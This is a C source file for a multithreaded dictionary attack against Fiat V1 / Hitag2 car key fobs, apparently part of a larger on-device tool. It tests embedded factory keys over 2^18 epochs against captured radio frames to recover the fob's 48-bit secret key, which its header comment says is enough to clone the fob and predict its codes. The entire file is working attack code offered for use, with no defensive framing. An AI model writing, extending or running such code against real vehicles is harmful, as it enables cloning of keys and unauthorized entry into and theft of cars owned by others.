// Fiat V1 / Hitag2 RKE dictionary attack (on-device, pthreads).
// Tries every embedded factory key x 2^18 epochs against the captured frames.
// A hit is the ABSOLUTE 48-bit key + epoch — enough to clone AND predict outright,
// and far faster than the full bitslice search when the fob uses a known key.
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include "fiat_bridge.h"
#include "fiat_keys.h"

#define FD_EPOCHS (1u << 18)

typedef struct {
    uint32_t uid;
    int n;
    const int *btn, *ctrl;
    const uint32_t *hop;
    int start, step;
    volatile int *found;
    unsigned long long *scanned;
    uint8_t *out;
    uint32_t *epoch;
    pthread_mutex_t *lk;
} fd_ctx;

static void *fd_worker(void *arg) {
    fd_ctx *d = arg;
    for (int ki = d->start; ki < FIAT_NKEYS; ki += d->step) {
        if (*d->found) return NULL;
        const uint8_t *key = FIAT_KEYS[ki];
        for (uint32_t e = 0; e < FD_EPOCHS; e++) {
            if (*d->found) return NULL;
            if (fb_output(fb_state_after_init(d->uid, d->btn[0], d->ctrl[0], key, (int)e)) != d->hop[0])
                continue;
            int ok = 1;
            for (int j = 1; j < d->n; j++)
                if (fb_output(fb_state_after_init(d->uid, d->btn[j], d->ctrl[j], key, (int)e)) != d->hop[j]) { ok = 0; break; }
            if (ok) {
                pthread_mutex_lock(d->lk);
                if (!*d->found) { *d->found = 1; memcpy(d->out, key, 6); *d->epoch = e; }
                pthread_mutex_unlock(d->lk);
                return NULL;
            }
        }
        __atomic_add_fetch(d->scanned, FD_EPOCHS, __ATOMIC_RELAXED);
    }
    return NULL;
}

static unsigned long long g_dict_scanned = 0;

// Returns 1 + fills out[6]=absolute key and *epoch on a hit; 0 on miss.
int fiat_dict(uint32_t uid, int n, const int *btn, const int *ctrl, const uint32_t *hop,
              int threads, uint8_t out[6], uint32_t *epoch) {
    if (n < 2) return 0;
    if (n > 8) n = 8;
    if (threads < 1) threads = 1;
    if (threads > 16) threads = 16;
    volatile int found = 0;
    uint32_t ep = 0;
    g_dict_scanned = 0;
    pthread_mutex_t lk = PTHREAD_MUTEX_INITIALIZER;
    pthread_t th[16];
    fd_ctx d[16];
    for (int i = 0; i < threads; i++) {
        d[i] = (fd_ctx){ uid, n, btn, ctrl, hop, i, threads, &found, &g_dict_scanned, out, &ep, &lk };
        pthread_create(&th[i], NULL, fd_worker, &d[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(th[i], NULL);
    if (found && epoch) *epoch = ep;
    return found;
}

unsigned long long fiat_dict_scanned(void) { return g_dict_scanned; }
